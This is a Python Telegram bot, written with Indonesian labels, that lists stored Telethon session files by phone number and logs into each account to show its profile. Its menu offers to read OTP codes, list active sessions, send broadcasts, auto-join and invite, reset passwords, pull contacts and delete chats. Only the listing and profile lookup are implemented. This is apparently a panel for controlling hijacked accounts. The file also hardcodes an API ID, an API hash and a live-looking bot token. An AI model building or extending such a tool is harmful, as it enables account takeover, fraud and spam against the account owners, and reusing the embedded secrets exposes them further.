import os
import re
import asyncio
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from telethon.sync import TelegramClient
from telethon.sessions import StringSession

# Konfigurasi
API_ID = 23416622
API_HASH = 'd1bc12a03ea26416b38b4616a36112b0'
BOT_TOKEN = '7961891403:AAE8sydM_elnN_J8uoGLQ1urCecoCDxPHdY'
SESSION_FOLDER = 'ew_sessions'
SESSIONS = {}

# Fungsi: Ambil list session
def get_registered_sessions():
    sessions = [f.replace('.session', '') for f in os.listdir(SESSION_FOLDER) if f.endswith('.session')]
    return sorted(sessions)

# Fungsi: Tampilkan halaman nomor
async def send_session_list(update: Update, context: ContextTypes.DEFAULT_TYPE, page: int = 0):
    sessions = get_registered_sessions()
    per_page = 10
    start = page * per_page
    end = start + per_page
    current_page_sessions = sessions[start:end]

    keyboard = [[InlineKeyboardButton(num, callback_data=f"select_{num}")] for num in current_page_sessions]

    nav_buttons = []
    if page > 0:
        nav_buttons.append(InlineKeyboardButton("⬅️ Back", callback_data=f"page_{page-1}"))
    if end < len(sessions):
        nav_buttons.append(InlineKeyboardButton("Next ➡️", callback_data=f"page_{page+1}"))
    if nav_buttons:
        keyboard.append(nav_buttons)

    reply_markup = InlineKeyboardMarkup(keyboard)
    if update.callback_query:
        await update.callback_query.edit_message_text("📱 Pilih nomor untuk dipantau OTP-nya:", reply_markup=reply_markup)
    else:
        await update.message.reply_text("📱 Pilih nomor untuk dipantau OTP-nya:", reply_markup=reply_markup)

# Command /user
async def user_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await send_session_list(update, context, 0)

# Fungsi: Tampilkan info akun saat nomor diklik
async def handle_select_number(update, context, phone_number):
    try:
        message = update.callback_query.message if update.callback_query else update.message

        session_path = os.path.join(SESSION_FOLDER, f"{phone_number}.session")
        if not os.path.exists(session_path):
            await message.reply_text("❌ Session tidak ditemukan.")
            return

        async with TelegramClient(session_path, API_ID, API_HASH) as client:
            me = await client.get_me()

            full_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
            username = f"@{me.username}" if me.username else "-"
            phone = me.phone or "-"
            user_id = me.id

        info = f"👤 *Info Akun*\n\n"
        info += f"📞 *Nomor*: `{phone}`\n"
        info += f"🆔 *ID Telegram*: `{user_id}`\n"
        info += f"🔹 *Nama*: {full_name}\n"
        info += f"🔹 *Username*: {username}\n"
        info += f"📝 *Bio*: _(tidak tersedia)_\n"

        await message.reply_text(info, parse_mode='Markdown')

        keyboard = [
    [
        InlineKeyboardButton("GET OTP", callback_data=f"get_otp_{phone_number}"),
        InlineKeyboardButton("SESI AKTIF", callback_data=f"active_session_{phone_number}")
    ],
    [
        InlineKeyboardButton("SEBAR BROADCAST", callback_data=f"broadcast_{phone_number}"),
        InlineKeyboardButton("AUTO JOIN & INVITE", callback_data=f"auto_join_{phone_number}")
    ],
    [
        InlineKeyboardButton("RESET PASSWORD", callback_data=f"reset_password_{phone_number}"),
        InlineKeyboardButton("DATA KONTAK", callback_data=f"data_contacts_{phone_number}")
    ],
    [
        InlineKeyboardButton("HAPUS PERCAKAPAN", callback_data=f"delete_chat_{phone_number}")
    ]
]

        reply_markup = InlineKeyboardMarkup(keyboard)
        await message.reply_text("🔧 Pilih aksi:", reply_markup=reply_markup)

    except Exception as e:
        if update.callback_query:
            await update.callback_query.answer()
            await update.callback_query.message.reply_text(f"⚠️ Terjadi kesalahan: {e}")
        elif update.message:
            await update.message.reply_text(f"⚠️ Terjadi kesalahan: {e}")
        else:
            print(f"⚠️ Error: {e}")

# Handler utama tombol
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    data = query.data
    if data.startswith("page_"):
        page = int(data.split("_")[1])
        await send_session_list(update, context, page)
    elif data.startswith("select_"):
        phone_number = data.split("_", 1)[1]
        await handle_select_number(update, context, phone_number)
    else:
        await query.edit_message_text(f"📦 Tombol lain: `{data}`", parse_mode='Markdown')

# Main
if __name__ == '__main__':
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("user", user_command))
    app.add_handler(CallbackQueryHandler(button_handler))

    print("🤖 Bot aktif. Gunakan /user untuk memulai.")
    app.run_polling()
